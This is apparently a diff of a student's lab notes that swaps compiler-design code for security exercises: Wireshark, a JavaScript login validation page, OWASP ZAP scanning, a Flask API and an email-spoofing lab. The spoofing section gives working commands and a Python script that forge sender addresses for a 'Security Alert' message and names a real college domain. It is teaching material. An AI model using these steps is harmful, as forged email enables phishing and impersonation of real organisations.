@@ -1,124 +1,87 @@
-code optimization:
-def evaluate_expression(expr, variables):
-    try:
-        for var, value in variables.items():
-            expr = expr.replace(var, str(value))
-        return str(eval(expr))
-    except Exception:
-        return expr  
-
-def optimize_c_code(c_code):
-    variables = {}  
-    declarations = {}  
-    optimized_lines = []
-    inside_function = False  
-    for line in c_code.splitlines():
-        stripped_line = line.strip()
-        if "{" in stripped_line and "void main" in stripped_line:
-            inside_function = True
-            optimized_lines.append(line)
-            continue
-        if "}" in stripped_line and inside_function:
-            inside_function = False
-            for decl in declarations.values():
-                optimized_lines.append(decl)
-            declarations.clear()  
-            optimized_lines.append(line)
-            continue
-        if inside_function:
-            if stripped_line.startswith("int ") and "=" in stripped_line and ";" in stripped_line:
-                var_declaration = stripped_line.split(";")[0]  
-                var, expr = var_declaration.split("=", 1) 
-                var = var.replace("int", "").strip() 
-                expr = expr.strip()  
-                optimized_expr = evaluate_expression(expr, variables)
-                variables[var] = int(optimized_expr) 
-                declarations[var] = f"int {var} = {optimized_expr};"  
-                continue  
-            elif "=" in stripped_line and ";" in stripped_line:
-                before_semi = stripped_line.split(";")[0] 
-                var, expr = before_semi.split("=", 1) 
-                var = var.strip()
-                expr = expr.strip()
-                optimized_expr = evaluate_expression(expr, variables)
-                if var in variables:  
-                    declarations[var] = f"int {var} = {optimized_expr};"
-                variables[var] = int(optimized_expr)  
-                continue  
-        
-        optimized_lines.append(line)
-
-    return "\n".join(optimized_lines)
-
-print("Enter your C code (end input with an empty line):")
-user_code_lines = []
-while True:
-    line = input()
-    if line.strip() == "":  
-        break
-    user_code_lines.append(line)
-
-user_c_code = "\n".join(user_code_lines)
-optimized_code = optimize_c_code(user_c_code)
-print("\nOptimized C Code:")
-print(optimized_code)
-
-
-
-
-
-
-
-
-
-
-8086 assembly language code
-print("Enter your three-address code (one line at a time).\nWhen you're done, enter an empty line:")
-tac_lines = []
-while True:
-    line = input()
-    if line.strip() == "":
-        break
-    tac_lines.append(line)
-
-assembly_code = []
-register_map = {}
-current_register = 1
-
-def get_next_register():
-    global current_register
-    reg = "R"+str(current_register)
-    current_register += 1
-    return reg
-
-for line in tac_lines:
-    parts = line.split("=")
-    target = parts[0].strip()
-    expression = parts[1].strip()
-    if "+" in expression:
-        operands = expression.split("+")
-        op1, op2 = operands[0].strip(), operands[1].strip()
-        reg1 = register_map.get(op1, get_next_register())
-        if op1 not in register_map:
-            assembly_code.append("LD "+reg1+" "+op1)
-            register_map[op1] = reg1
-        reg2 = register_map.get(op2, get_next_register())
-        if op2 not in register_map:
-            assembly_code.append("LD "+reg2+" "+op2)
-            register_map[op2] = reg2
-        reg_result = get_next_register()
-        assembly_code.append("ADD "+reg_result+" "+reg1+" "+reg2)
-        assembly_code.append("ST "+target+" "+reg_result)
-        register_map[target] = reg_result
-    else:
-        reg = get_next_register()
-        assembly_code.append("LD "+reg+" "+expression)
-        assembly_code.append("ST "+target+" "+reg)
-        register_map[target] = reg
-print("\nGenerated Assembly Code:")
-
-for line in assembly_code:
-    print(line)
+ex1
+Ex No:01     INSTALL WIRESHARK AND EXPLORE THE VARIOUS PROTOCOLS 
+Date:     
+A. ANALYZE THE DIFFERENCE BETWEEN HTTP VS HTTPS 
+AIM: 
+To install Wireshark and explore the various protocols and analyze the 
+difference between HTTP and HTTPS. 
+PROCEDURE: 
+STEP 1: Download Wireshark for windows from the following link  
+https://www.wireshark.org/download.html 
+STEP 2: Now,install wireshark which is downloaded.After installation,open wireshark 
+STEP 3: Now, open the vulnerable webpage in which the packets have to be 
+captured and enter the details. 
+ 
+ 
+ 
+STEP 4: Now, you can see the packets that are in transmission. 
+ 
+ 
+ 
+STEP 5: You can filter the packets to the protocol needed by typing the protocol in 
+the filter option. Here, the filter is done to see only the HTTP packets. 
+ 
+ 
+STEP 6: Now, you can see the disadvantage of HTTP as the username and 
+password typed in the HTTP webpage and sent can be tracked using Wireshark. We 
+can see the username and the password typed are shown as key value pairs. 
+STEP 7: Let us try the same with HTTPS-enabled web page. 
+STEP 8: Now, you can see the packets transferred through HTTPS protocol . You 
+can filter it out using the IP address of the destination or by typing TLS. 
+STEP 9: You can go to the packet to see the description of the HTTPS packet. 
+It has the Handshake Protocol, which adds a layer of security to it. 
+And the data is encrypted for which the encrypted data is shown there. 
+You can also observe: 
+1. Client Hello traffic 
+2. Server Hello Traffic 
+3. Certificate Traffic 
+4. Key Exchange Traffic. 
+5. New Session Ticket Traffic 
+6. Encrypted Data Exchange. 
+So, by this we can see the difference between HTTP and HTTPS. 
+RESULT: 
+Thus, installing Wireshark and exploring the various protocols and analyze the 
+difference between HTTP and HTTPS has been done successfully. 
+Ex No:01b          
+Date:   
+AIM: 
+B. ANALYZE THE VARIOUS SECURITY MECHANISMS  
+EMBEDDED WITH DIFFERENT PROTOCOLS 
+To install Wireshark and explore the various protocols and analyze the various 
+security mechanisms embedded with different protocols. 
+PROCEDURE: 
+STEP 1: Check whether Wireshark is installed on your device by typing command:   
+Wireshark --version 
+STEP 2: Capture the Network traffic using the command: dumpcap -i <interface> -w 
+capture_file.pcap   Ctrl+C to stop. 
+STEP 3: Use tshark to Analyse specific protocols. 
+tshark -r capture_file.pcap -Y “ssl” 
+STEP 4: Now, Open Wireshark and open the file that you created and modified now. 
+ 
+ 
+ 
+ 
+STEP 5: In this way, we can get different protocols used and the descriptions of it by 
+double-clicking the packet. 
+ 
+#To view HTTP and HTTPS packets, 
+ 
+HTTP: 
+ 
+ 
+ 
+HTTPS: 
+ 
+ 
+ 
+ 
+ 
+DNS: 
+TCP: 
+RESULT : 
+Thus, installing Wireshark, exploring the various protocols, and analyzing the 
+various security mechanisms embedded with different protocols has been done 
+successfully.
 
 
 
@@ -139,52 +102,77 @@ for line in assembly_code:
 
 
 
-THREE ADDRESS CODE GENERATOR    
-print("Enter an arithmetic expression (with or without assignment):")
-expression = input().strip()
-tac = []
-temp_counter = 1  
-def get_temp():
-    global temp_counter
-    temp = f"t{temp_counter}"
-    temp_counter += 1
-    return temp
 
-def parse_expression(expr):
-    if "(" in expr:
-        open_paren = expr.rfind("(")
-        close_paren = expr.find(")", open_paren)
-        inner_expr = expr[open_paren + 1:close_paren]
-        temp_var = parse_expression(inner_expr)
-        expr = expr[:open_paren] + temp_var + expr[close_paren + 1:]
-        return parse_expression(expr)
-    for op in ["+", "-", "*", "/"]:
-        if op in expr:
-            left, right = expr.split(op, 1)
-            left = left.strip()
-            right = right.strip()
-            temp_var_left = parse_expression(left) if any(c in left for c in "+-*/") else left
-            temp_var_right = parse_expression(right) if any(c in right for c in "+-*/") else right
-            temp_var = get_temp()
-            tac.append(temp_var+" = "+temp_var_left+" "+op+" "+temp_var_right)
-            return temp_var
-    return expr.strip()
-if "=" in expression:
-    target, expr = expression.split("=", 1)
-    target = target.strip()
-    expr = expr.strip()
-    result_var = parse_expression(expr)
-    tac.append(f"{target} = {result_var}")
-else:
-    parse_expression(expression)
 
-print("\nThree-Address Code:")
-for line in tac:
-    print(line)
+ex2
+<!DOCTYPE html> 
+<html> 
+<body> 
+<h1 style="text-align: center;color: red; font-family: 'Times New Roman', Times, 
+serif;">INPUT VALIDATION</h1> 
+<div style="display:flex;align-items:center;justify-content: center;height: 50vh;"> 
+<br><form> 
+<h4> USER NAME : </h4><input type="text" id="username" 
+name=""="username"> <br> 
+<h3> PASSWORD :</h3> <input type="password" id="password" 
+name="password"><br> 
+<button onclick="login()">LOGIN</button> 
+</form> 
+</div> 
+<script> 
+function login() { 
+var un = document.getElementById("username").value.trim(); 
+var pass = document.getElementById("password").value.trim(); 
+var usernamePattern = /^[A-Za-z]{1,20}$/; 
+var passwordPattern = /^(?=.*[A-Za-z])(?=.*\d)[A-Za-z\d]{6,15}$/; 
+if (!usernamePattern.test(un)) { alert("Wrong username"); } 
+else if (!passwordPattern.test(pass)) { alert("Wrong Password"); } 
+else alert("Login Successful"); 
+}</script> 
+</body> 
+</html> 
 
 
 
 
+ex3
+Ex No :03           
+Date:  
+AIM: 
+To install the OWASP ZAP tool and analyze the vulnerabilities for a website. 
+PROCEDURE: 
+Step 1: Launch the OWASP Zap tool. 
+Step 2: Select start. ZAP GUI will open. Select Automated Scan. 
+ 
+ 
+ 
+Step 3: Select the URL to attack: 
+a. The URL to be tested has to be sample websites. 
+b. URL which doesn’t provide permissions for testing shouldn’t be used. 
+c. Some same website that can be used 
+ http://lab.awh.zdresearch.com/chapter2/mutillidae/index.p
+ hp?page=l ogin.php 
+ http://www.vulnweb.com/ 
+ 
+Step 4: Paste the URL to attack and Click on “Attack” button 
+Step 5: Spider the URL. 
+Step 6: Once Spidering is done, Active scan is done automatically 
+ 
+ 
+ 
+Step 7: Click on the “Alerts” tab to view the vulnerabilities 
+ 
+ 
+Step 8: Investigate each vulnerability 
+a. Click on each vulnerability to get a detailed information. 
+b. Verify and understand the nature and potential impact of each issue. 
+Step 9: Generate the report 
+a. In the “Reports” tab, select “Generate Report” 
+b. The following screen appears. Select the “Scope” tab, select the report 
+title,report name, and directory and Click on the “Generate Report” button. 
+c. A detailed scanning report will be generated. 
+RESULT : 
+Thus the vulnerabilities are identified using OWASP ZAP tool. 
 
 
 
@@ -199,98 +187,254 @@ for line in tac:
 
 
 
-CONTROL STRUCTURE RECOGNISER     
-YACC CODE :
-%{
-#include<stdio.h>
-int yylex();
-%}
 
-%token IF ELSE WHILE FOR SWITCH CASE DEFAULT OPEN_BRACE CLOSE_BRACE SEMICOLON COLON OPEN_BRACKET CLOSE_BRACKET BREAK
 
-%%
-program: statement
-| program statement
-;
 
-statement:if_statement
-|while_loop
-|switch_case_statement
-|for_loop
-;
 
-if_statement:IF OPEN_BRACKET expression_opt CLOSE_BRACKET OPEN_BRACE
-expression_opt CLOSE_BRACE ELSE OPEN_BRACE expression_opt CLOSE_BRACE
+
+ex4
+Step 1: Install Dependencies
+Ensure you have Python and Flask installed on your system. If not, install them using:
+
+sh
+Copy
+Edit
+pip install flask
+Step 2: Create a Flask App
+Create a new Python file named app.py and add the following code:
+
+python
+Copy
+Edit
+from flask import Flask, jsonify, request
+
+app = Flask(__name__)
+
+# Sample data (in-memory storage)
+users = [
+    {"id": 1, "name": "Alice"},
+    {"id": 2, "name": "Bob"}
+]
+
+# Home route
+@app.route('/')
+def home():
+    return "Welcome to the Simple REST API!"
+
+# GET all users
+@app.route('/users', methods=['GET'])
+def get_users():
+    return jsonify(users)
+
+# GET a user by ID
+@app.route('/users/<int:user_id>', methods=['GET'])
+def get_user(user_id):
+    user = next((user for user in users if user["id"] == user_id), None)
+    if user:
+        return jsonify(user)
+    return jsonify({"message": "User not found"}), 404
+
+# POST (Create a new user)
+@app.route('/users', methods=['POST'])
+def create_user():
+    data = request.get_json()
+    new_user = {
+        "id": len(users) + 1,
+        "name": data["name"]
+    }
+    users.append(new_user)
+    return jsonify(new_user), 201
+
+# PUT (Update user details)
+@app.route('/users/<int:user_id>', methods=['PUT'])
+def update_user(user_id):
+    data = request.get_json()
+    user = next((user for user in users if user["id"] == user_id), None)
+    if user:
+        user["name"] = data["name"]
+        return jsonify(user)
+    return jsonify({"message": "User not found"}), 404
+
+# DELETE (Remove a user)
+@app.route('/users/<int:user_id>', methods=['DELETE'])
+def delete_user(user_id):
+    global users
+    users = [user for user in users if user["id"] != user_id]
+    return jsonify({"message": "User deleted"}), 200
+
+if __name__ == '__main__':
+    app.run(debug=True)
+Step 3: Run the Flask App
+Save the app.py file and run it using:
+
+sh
+Copy
+Edit
+python app.py
+By default, Flask will run on http://127.0.0.1:5000/.
+
+Step 4: Test APIs Using Postman
+Open Postman and create a new request.
+
+Test the API Endpoints:
+
+GET all users:
+
+Method: GET
+
+URL: http://127.0.0.1:5000/users
+
+GET a single user by ID:
+
+Method: GET
+
+URL: http://127.0.0.1:5000/users/1
+
+POST a new user:
+
+Method: POST
+
+URL: http://127.0.0.1:5000/users
+
+Body (JSON format):
+
+json
+Copy
+Edit
 {
-printf("Recognized IF Else statement\n");
+    "name": "Charlie"
 }
-;
-while_loop:WHILE OPEN_BRACKET expression_opt CLOSE_BRACKET OPEN_BRACE
-expression_opt CLOSE_BRACE
+PUT (Update a user):
+
+Method: PUT
+
+URL: http://127.0.0.1:5000/users/1
+
+Body (JSON format):
+
+json
+Copy
+Edit
 {
-printf("Recognized WHILE loop\n");
+    "name": "Alice Updated"
 }
-;
-switch_case_statement:SWITCH OPEN_BRACKET expression_opt CLOSE_BRACKET
-OPEN_BRACE case_list CLOSE_BRACE
-{
-printf("Recognized SWITCH_CASE statement with DEFAULT\n");
-}
-;
-for_loop:FOR OPEN_BRACKET expression_opt SEMICOLON expression_opt
-CLOSE_BRACKET OPEN_BRACE expression_opt CLOSE_BRACE
-{
-printf("Recognized FOR loop\n");
-}
-;
-case_list:CASE expression COLON expression BREAK
-SEMICOLON DEFAULT COLON expression_opt
-;
+DELETE a user:
 
-expression_opt:/*empty*/
-|expression
-|expression SEMICOLON
-;
-expression:
-;
-%%
+Method: DELETE
 
-int yyerror(const char *s){
-fprintf(stderr,"Error=%s\n", s);
-return 1;
-}
+URL: http://127.0.0.1:5000/users/1
 
-int main() {
-printf("\nEnter control structure:");
-yyparse();
-return 0;
-}
+Step 5: Verify API Responses
+Check the JSON responses returned by each API request in Postman.
 
 
-LEX CODE:
-%{
-#include "y.tab.h"
-#include <stdio.h>
-#include <stdlib.h>
-%}
 
-%%
-"if" { return IF; }
-"else" { return ELSE; }
-"while" { return WHILE; }
-"for" { return FOR; }
-"switch" { return SWITCH; }
-"case" { return CASE; }
-"default" { return DEFAULT; }
-"break" { return BREAK; }
-"(" { return OPEN_BRACKET; }
-")" { return CLOSE_BRACKET; }
-"{" { return OPEN_BRACE; }
-"}" { return CLOSE_BRACE; }
-";" { return SEMICOLON; }
-[\t\n] ;
-. ;
-%%
 
-int yywrap() {  return 1;  }
 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+ex 6 spoofing 
+✅ How to Perform Email Spoofing on Windows
+🔧 Requirements:
+Python (Install from python.org)
+
+Git for Windows (Download Git)
+
+Command Prompt / PowerShell
+
+Optional: Terminus or Windows Terminal
+
+✅ Step-by-step Setup
+Step 1: Install Git and Clone the Tool
+Open Command Prompt or PowerShell, then run:
+
+bash
+Copy
+Edit
+git clone https://github.com/sighook/spoofcheck.git
+cd spoofcheck
+Step 2: Install Python and Required Modules
+Make sure Python is installed. Then, install required dependencies:
+
+bash
+Copy
+Edit
+pip install -r requirements.txt
+If pip isn't recognized, make sure Python was installed with the Add to PATH option enabled.
+
+✅ Step 3: Check for Vulnerability
+Use this command to check if a domain is vulnerable:
+
+bash
+Copy
+Edit
+python spoofcheck.py licet.ac.in
+This will show whether SPF, DKIM, and DMARC records are properly configured.
+
+✅ Step 4: Create HTML Spoof Email Template
+Use any text editor (like Notepad++, VS Code, or Sublime Text) to create your HTML template. You already have the sample in your question.
+
+Save it as: spoof_email.html
+
+✅ Step 5: Send Spoofed Email (Windows-Friendly Tools)
+There are 3 Windows-compatible options:
+
+🔹 Option A: Use a Free Tool Like [SendEmail.exe]
+Download: SendEmail Windows Binary
+
+Use the following syntax:
+
+bash
+Copy
+Edit
+sendEmail.exe -f attacker@spoof.com -t victim@example.com -u "Security Alert!" -m "Check your login!" -s smtp.server.com:587 -xu your_email -xp your_password -o message-file=spoof_email.html
+⚠️ Warning: Some providers block spoof emails. Use tools like smtp2go.com or mailtrap.io for safe testing.
+
+🔹 Option B: Use Python to Send Email
+Create a script like this:
+
+python
+Copy
+Edit
+import smtplib
+from email.mime.text import MIMEText
+
+with open("spoof_email.html", "r") as file:
+    html = file.read()
+
+msg = MIMEText(html, 'html')
+msg['Subject'] = 'Security Notification'
+msg['From'] = 'admin@fake-licet.in'
+msg['To'] = 'victim@example.com'
+
+server = smtplib.SMTP('smtp.gmail.com', 587)
+server.starttls()
+server.login("youremail@gmail.com", "yourpassword")  # Use app password for Gmail
+server.send_message(msg)
+server.quit()
+✅ Step 6: Done!
+Check the recipient inbox. If your spoofed mail arrives without getting flagged, the domain is vulnerable.
+
+💡 Important Notes
+This lab is only for educational purposes and must not be used maliciously.
+
+Modern email providers have DMARC, SPF, DKIM to block spoofing. Use domains without these protections for safe lab testing.
+
+Tools like mailtrap.io allow safe email testing without affecting real users.
